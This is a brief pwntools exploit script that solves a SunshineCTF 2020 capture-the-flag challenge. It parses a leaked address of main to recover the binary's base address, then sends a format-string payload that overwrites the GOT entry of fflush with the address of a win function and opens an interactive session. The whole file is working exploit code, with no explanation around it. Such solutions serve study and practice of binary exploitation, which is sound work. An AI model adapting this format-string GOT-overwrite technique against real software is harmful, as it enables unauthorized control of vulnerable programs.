from pwn import *

binary = context.binary = ELF('./chall_12')

if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote('chal.2020.sunshinectf.org', 30012)

p.recvuntil('Just a single second: ')
_ = p.recvline().strip()
main = int(_,16)
binary.address = main - binary.sym.main
log.info('binary.address: ' + hex(binary.address))
p.sendline()

offset = 6
payload = fmtstr_payload(offset,{binary.got.fflush:binary.sym.win})
p.sendline(payload)

null = payload.find(b'\x00')
p.recvuntil(payload[null-3:null])

p.interactive()
